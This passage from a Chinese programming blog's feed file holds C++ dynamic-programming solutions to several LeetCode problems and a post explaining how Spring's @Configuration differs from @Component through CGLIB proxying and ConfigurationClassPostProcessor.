class="built_in">max</span>(dp[i], j * dp[i - j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：分割类型的问题。</p></li><li><p>题目四：<a href="https://leetcode.cn/problems/delete-operation-for-two-strings">两个字符串的删除操作</a><br>给定两个单词word1和word2，返回使得word1和word2相同所需的最小步数。每步可以删除任意一个字符串中的一个字符。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = word<span class="number">1.l</span>ength(), n = word<span class="number">2.l</span>ength();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                dp[<span class="number">0</span>][j] = j;</span><br><span class="line">                <span class="keyword">if</span> (word1[i - <span class="number">1</span>] == word2[j - <span class="number">1</span>]) dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                <span class="keyword">else</span> dp[i][j] = <span class="built_in">min</span>(dp[i - <span class="number">1</span>][j], dp[i][j - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：最长公共子序列的变种题，注意i和j为0时的赋值。</p></li><li><p>题目五：<a href="https://leetcode.cn/problems/regular-expression-matching">正则表达式匹配</a><br>给你一个字符串s和一个字符规律p，请你来实现一个支持’.’和’*’的正则表达式匹配。</p><ul><li>‘.’匹配任意单个字符。</li><li>‘*’匹配零个或多个前面的那一个元素。</li></ul><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">isMatch</span><span class="params">(string s, string p)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = s.<span class="built_in">length</span>(), n = p.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n + <span class="number">1</span>, <span class="literal">false</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (p[j - <span class="number">1</span>] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">                    dp[i][j] = dp[i][j] || dp[i][j - <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (p[j - <span class="number">2</span>] == s[i - <span class="number">1</span>] || p[j - <span class="number">2</span>] == <span class="string">&#x27;.&#x27;</span>))</span><br><span class="line">                        dp[i][j] = dp[i][j] || dp[i - <span class="number">1</span>][j];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; (p[j - <span class="number">1</span>] == s[i - <span class="number">1</span>] || p[j - <span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                       dp[i][j] = dp[i][j] || dp[i - <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常麻烦的题，i&#x3D;0是为了处理p的开头两个就有’*‘的情况，而当p[j]&#x3D;’*‘时，本质上只会有两种情况：匹配s末尾的一个字符，将该字符扔掉，而该组合还可以继续进行匹配；不匹配字符，将该组合扔掉，不再进行匹配。如果仍然不太理解的话，可以考虑用for循环处理。</p></li><li><p>题目六：<a href="https://leetcode.cn/problems/target-sum">目标和</a><br>给你一个非负整数数组nums和一个整数target。向数组中的每个整数前添加’+’或’-‘，然后串联起所有整数，可以构造一个表达式(例如’+2-1’)。<br>返回可以通过上述方法构造的、运算结果等于target的不同表达式的数目。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findTargetSumWays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="type">int</span> diff = sum - target;</span><br><span class="line">        <span class="keyword">if</span> (diff &lt; <span class="number">0</span> || diff % <span class="number">2</span> != <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> neg = (sum - target) / <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(neg + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = neg; j &gt;= nums[i]; --j) &#123;</span><br><span class="line">                dp[j] = dp[j] + dp[j - nums[i]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[neg];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上是一个0-1背包问题，设有neg个数字取负，则有sum-neg-neg&#x3D;target，剩下的就是选取元素之和为neg的元素排列个数了。</p></li><li><p>题目七：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-transaction-fee">买卖股票的最佳时机含手续费</a><br>给定一个整数数组prices，其中prices[i]表示第i天的股票价格；整数fee代表了交易股票的手续费用。<br>你可以无限次地完成交易，但是你每笔交易都需要付手续费。如果你已经购买了一个股票，在卖出它之前你就不能再继续购买股票了。<br>返回获得利润的最大值。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;prices, <span class="type">int</span> fee)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>, dp[<span class="number">1</span>] = -prices[<span class="number">0</span>], dp[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            dp[<span class="number">0</span>] = <span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">2</span>]);</span><br><span class="line">            dp[<span class="number">1</span>] = <span class="built_in">max</span>(dp[<span class="number">1</span>], <span class="built_in">max</span>(dp[<span class="number">0</span>] - prices[i], dp[<span class="number">2</span>] - prices[i]));</span><br><span class="line">            dp[<span class="number">2</span>] = <span class="built_in">max</span>(dp[<span class="number">2</span>], dp[<span class="number">1</span>] + prices[i] - fee);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(dp[<span class="number">0</span>], dp[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：三个状态：未持有股票未售卖；持有股票；持有股票刚售卖。</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> LeetCode </tag>
            
            <tag> 动态规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot注解：Component与Configure</title>
      <link href="/post/59dcc30f.html"/>
      <url>/post/59dcc30f.html</url>
      
        <content type="html"><![CDATA[<p><code>@Component</code>和<code>@Configure</code>都是在SpringBoot中用于配置的常见注解，一个多用于自动化配置，另一个多用于第三方库的Config配置。</p><h2 id="一、注解定义"><a href="#一、注解定义" class="headerlink" title="一、注解定义"></a>一、注解定义</h2><p>两者定义分别如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// @Component的定义</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Indexed</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Component &#123;</span><br><span class="line">​</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * The value may indicate a suggestion for a logical component name,</span></span><br><span class="line"><span class="comment">   * to be turned into a Spring bean in case of an autodetected component.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> the suggested component name, if any (or empty String otherwise)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">​</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// @Configure的定义</span></span><br><span class="line"><span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Configuration &#123;</span><br><span class="line">​</span><br><span class="line">  <span class="meta">@AliasFor(annotation = Component.class)</span></span><br><span class="line">  String <span class="title function_">value</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">​</span><br><span class="line">  <span class="type">boolean</span> <span class="title function_">proxyBeanMethods</span><span class="params">()</span> <span class="keyword">default</span> <span class="literal">true</span>;</span><br><span class="line">​</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很显然，<code>@Configure</code>注解本质上也是<code>@Component</code>，因此<code>@ComponentScan</code>能扫描到<code>@Configure</code>注解的类。</p><h2 id="二、注解使用"><a href="#二、注解使用" class="headerlink" title="二、注解使用"></a>二、注解使用</h2><p>在SpringBoot中，对于配置类来讲，大体可以分为两类，一类是<strong>LITE模式</strong>，另一类是<strong>FULL模式</strong>，<code>@Component</code>注解对应前者，而<code>@Configure</code>注解对应后者。</p><p>使用<code>@Component</code>实现配置类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AppConfig</span> &#123;</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> Foo <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;foo() invoked...&quot;</span>);</span><br><span class="line">    <span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line">    System.out.println(<span class="string">&quot;foo() 方法的 foo hashcode: &quot;</span> + foo.hashCode());</span><br><span class="line">    <span class="keyword">return</span> foo;</span><br><span class="line">  &#125;</span><br><span class="line">​</span><br><span class="line">  <span class="meta">@Bean</span></span><br><span class="line">  <span class="keyword">public</span> Eoo <span class="title function_">eoo</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;eoo() invoked...&quot;</span>);</span><br><span class="line">    <span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> foo();</span><br><span class="line">    System.out.println(<span class="string">&quot;eoo() 方法的 foo hashcode: &quot;</span>+ foo.hashCode());</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Eoo</span>();</span><br><span class="line">  &#125;</span><br><span class="line">​</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">AnnotationConfigApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(AppConfig.class);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 815992954</span><br><span class="line">eoo() invoked...</span><br><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 868737467</span><br><span class="line">eoo() 方法的 foo hashcode: 868737467</span><br></pre></td></tr></table></figure><p>我们可以注意到，<code>@Bean</code>注解的<code>foo()</code>方法和<code>eoo()</code>方法执行的<code>foo()</code>方法来自不同的<code>foo</code>对象，但是当我们换成使用<code>@Configure</code>注解时，执行结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">foo() invoked...</span><br><span class="line">foo() 方法的 foo hashcode: 849373393</span><br><span class="line">eoo() invoked...</span><br><span class="line">eoo() 方法的 foo hashcode: 849373393</span><br></pre></td></tr></table></figure><p>显然<code>foo()</code>方法只执行了一次，<code>foo</code>对象只产生了一个，这就是<code>@Component</code>和<code>@Configure</code>的区别现象展示。简单地解释这个现象就是当调用<code>foo()</code>这个方法时，都去容器获取<code>foo</code>这个Bean即可，而要做到这一点可以使用<strong>代理</strong>，也就是说<code>@Configure</code>注解的类会被代理，更加准确的说是一个类的BeanDefinition的Attribute中有<strong>FULL</strong>配置属性，那么这个类就会被Spring代理。</p><h2 id="三、如何实现FULL配置的代理"><a href="#三、如何实现FULL配置的代理" class="headerlink" title="三、如何实现FULL配置的代理"></a>三、如何实现FULL配置的代理</h2><p>重要的一点在于SpringBoot在什么时间将这些配置类转变为FULL模式或者是LITE模式，需要先了解一个关键的类：<code>ConfigurationClassPostProcessor</code>。</p><h3 id="3-1-ConfigurationClassPostProcessor是什么"><a href="#3-1-ConfigurationClassPostProcessor是什么" class="headerlink" title="3.1 ConfigurationClassPostProcessor是什么"></a>3.1 ConfigurationClassPostProcessor是什么</h3><p>这个类的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConfigurationClassPostProcessor</span> <span class="keyword">implements</span> </span><br><span class="line">                                    <span class="title class_">BeanDefinitionRegistryPostProcessor</span>,</span><br><span class="line">                                    PriorityOrdered, </span><br><span class="line">                                    ResourceLoaderAware, </span><br><span class="line">                                    BeanClassLoaderAware, </span><br><span class="line">                                    EnvironmentAware &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由这个类定义可知这个类的类型为BeanDefinitionRegistryPostProcessor，以及实现了众多Spring内置的Aware接口。</p><h3 id="3-2-ConfigurationClassPostProcessor在什么时间被实例化"><a href="#3-2-ConfigurationClassPostProcessor在什么时间被实例化" class="headerlink" title="3.2 ConfigurationClassPostProcessor在什么时间被实例化"></a>3.2 ConfigurationClassPostProcessor在什么时间被实例化</h3><p>需要先明确一个前提，那就是ConfigurationClassPostProcessor这个类对应的BeanDefinition在什么时间注册到Spring的容器中的，因为Spring的实例化比较特殊，主要是基于BeanDefinition来处理的，那么现在这个问题就可以转变为ConfigurationClassPostProcessor这个类是在什么时间被注册为一个Beandefinition的？这个可以在源代码中找到答案，具体其实就是在初始化这个Spring容器的时候。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">AnnotationConfigApplicationContext</span>(ConfigClass.class)</span><br><span class="line">  -&gt; <span class="keyword">new</span> <span class="title class_">AnnotatedBeanDefinitionReader</span>(<span class="built_in">this</span>);</span><br><span class="line">    -&gt; AnnotationConfigUtils.registerAnnotationConfigProcessors(<span class="built_in">this</span>.registry);</span><br><span class="line">      -&gt; <span class="keyword">new</span> <span class="title class_">RootBeanDefinition</span>(ConfigurationClassPostProcessor.class);</span><br><span class="line">        -&gt; registerPostProcessor(BeanDefinitionRegistry registry, RootBeanDefinition definition, String beanName)</span><br></pre></td></tr></table></figure><p>从这里可以看出，ConfigurationClassPostProcessor已经被注册为了一个BeanDefinition。</p><h3 id="3-3-Component与-Configuration的实现区别"><a href="#3-3-Component与-Configuration的实现区别" class="headerlink" title="3.3 @Component与@Configuration的实现区别"></a>3.3 @Component与@Configuration的实现区别</h3><p>上面ConfigurationClassPostProcessor已经注册到BeanDefinition注册中心了，说明Spring会在某个时间点将其处理成一个Bean，那么具体的时间点就是在BeanFactory所有的后置处理器的处理过程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AbstractApplicationContext</span><br><span class="line">  -&gt; refresh()</span><br><span class="line">    -&gt; invokeBeanFactoryPostProcessors(beanFactory);</span><br><span class="line">      -&gt; PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(beanFactory, getBeanFactoryPostProcessors());</span><br></pre></td></tr></table></figure><p>这个处理BeanFactory的后置处理器简单说来就是主要处理所有实现了BeanFactoryPostProcessor及BeanDefinitionRegistryPostProcessor的类，当然ConfigurationClassPostProcessor就是其中的一个，那么接下来我们看看实现的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postProcessBeanDefinitionRegistry</span><span class="params">(BeanDefinitionRegistry registry)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">registryId</span> <span class="operator">=</span> System.identityHashCode(registry);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.registriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanDefinitionRegistry already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.factoriesPostProcessed.contains(registryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanFactory already called on this post-processor against &quot;</span> + registry);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.registriesPostProcessed.add(registryId);</span><br><span class="line">​</span><br><span class="line">    processConfigBeanDefinitions(registry);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">factoryId</span> <span class="operator">=</span> System.identityHashCode(beanFactory);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.factoriesPostProcessed.contains(factoryId)) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(</span><br><span class="line">          <span class="string">&quot;postProcessBeanFactory already called on this post-processor against &quot;</span> + beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factoriesPostProcessed.add(factoryId);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">this</span>.registriesPostProcessed.contains(factoryId)) &#123;</span><br><span class="line">      <span class="comment">// BeanDefinitionRegistryPostProcessor hook apparently not supported...</span></span><br><span class="line">      <span class="comment">// Simply call processConfigurationClasses lazily at this point then.</span></span><br><span class="line">      processConfigBeanDefinitions((BeanDefinitionRegistry) beanFactory);</span><br><span class="line">    &#125;</span><br><span class="line">​</span><br><span class="line">    enhanceConfigurationClasses(beanFactory);</span><br><span class="line">    beanFactory.addBeanPostProcessor(<span class="keyword">new</span> <span class="title class_">ImportAwareBeanPostProcessor</span>(beanFactory));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>第一个方法主要完成了内部类，<code>@Component</code>，<code>@ComponentScan</code>，<code>@Bean</code>，<code>@Configuration</code>，<code>@Import</code>等等注解的处理，<code>processConfigBeanDefinitions()</code>把<code>@Configuration</code>类里所有<code>@Bean</code>、<code>@Import</code>、<code>@ComponentScan</code>等再解析一遍，生成新的BeanDefinition塞回注册表(属性设置为FULL)。然后生成对应的BeanDefinition，另一个方法就是对<code>@Configuration</code>使用CGLIB进行增强。</p><p>在第一个方法中的<code>processConfigBeanDefinitions()</code>方法中有一个<code>checkConfigurationClassCandidate()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkConfigurationClassCandidate</span><span class="params">(</span></span><br><span class="line"><span class="params">    BeanDefinition beanDef, MetadataReaderFactory metadataReaderFactory)</span> &#123;</span><br><span class="line">    </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    Map&lt;String, Object&gt; config = metadata.getAnnotationAttributes(Configuration.class.getName());</span><br><span class="line">    <span class="keyword">if</span> (config != <span class="literal">null</span> &amp;&amp; !Boolean.FALSE.equals(config.get(<span class="string">&quot;proxyBeanMethods&quot;</span>))) &#123;</span><br><span class="line">        beanDef.setAttribute(CONFIGURATION_CLASS_ATTRIBUTE, CONFIGURATION_CLASS_FULL);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (config != <span class="literal">null</span> || isConfigurationCandidate(metadata)) &#123;</span><br><span class="line">        beanDef.setAttribute(CONFIGURATION_CLASS_ATTRIBUTE, CONFIGURATION_CLASS_LITE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...      </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据程序的判断可知，如果一个类被<code>@Configuration</code>标注且代理模式为true，那么这个类对应的<strong>BeanDefinition</strong>将会被Spring添加一个FULL配置模式的属性，这个”属性“在Spring中有一个特定的接口就是AttributeAccessor，BeanDefinition就是继承了这个接口。</p><p>在这里也能看到<code>@Configuration(proxyBeanMethods = false)</code>和<code>@Component</code>一样效果，都是LITE模式。</p><p>最后则是由<code>enhanceConfigurationClasses()</code>方法对<code>@Configuration</code>注解标注的类的增强，进行CGLIB代理，代码就不展示了，CGLIB的原理可以看我的另一篇文章<a href="https://re-char.github.io/post/d45f1ea9.html">Java代理模式: JDK代理与CGLIB代理</a>。</p><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>一句话概括就是<code>@Configuration</code>中所有带<code>@Bean</code>注解的方法都会被动态代理，因此调用该方法返回的都是同一个实例。</p>]]></content>
      
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
            <tag> 后端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用bucket4j+redis实现统一限流机制</title>
      <link href="/post/5e36398c.html"/>
      <url>/post/5e36398c.html</url>
      
